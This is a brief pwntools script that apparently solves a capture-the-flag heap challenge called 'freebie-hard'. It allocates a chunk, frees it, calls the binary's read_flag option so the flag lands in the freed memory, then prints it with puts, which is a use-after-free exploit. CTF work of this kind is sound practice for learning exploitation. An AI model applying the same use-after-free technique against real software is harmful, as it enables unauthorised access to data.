from pwn import *

context(arch="amd64", os="linux", log_level="debug")

io = process("./freebie-hard")


def malloc(size: int):
    io.recvuntil(b"):")
    io.sendline(b"malloc")
    io.recvuntil(b"Size:")
    io.sendline(str(size).encode())


def free():
    io.recvuntil(b"):")
    io.sendline(b"free")


def puts():
    io.recvuntil(b"):")
    io.sendline(b"puts")


def read_flag():
    io.recvuntil(b"):")
    io.sendline(b"read_flag")


malloc(618)
free()
read_flag()
puts()

io.interactive()
